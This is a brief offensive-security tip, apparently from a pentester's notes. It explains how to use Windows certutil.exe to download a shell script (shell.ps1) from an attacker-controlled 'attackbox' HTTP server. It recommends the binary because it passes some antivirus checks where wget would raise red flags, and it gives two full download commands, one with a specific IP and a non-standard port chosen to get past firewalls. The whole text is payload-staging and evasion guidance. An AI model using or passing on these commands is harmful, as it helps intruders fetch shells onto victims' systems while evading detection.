This is for when you have an attackbox with a http server where you
want to get the data from it. CertUtil is a part of LOLBins and will therefore
pass a few different AVs rather than just hitting a regular wget, which could
cause some red flags.

certutil.exe -urlcache -split -f http:///shell.ps1

on windows, sometimes firewalls can be a little tricky, its ALWAYS best to specify
the port number, usually i like to use a non standard port like so:

certutil.exe -urlcache -split -f http://10.50.78.32:1234/shell.ps1
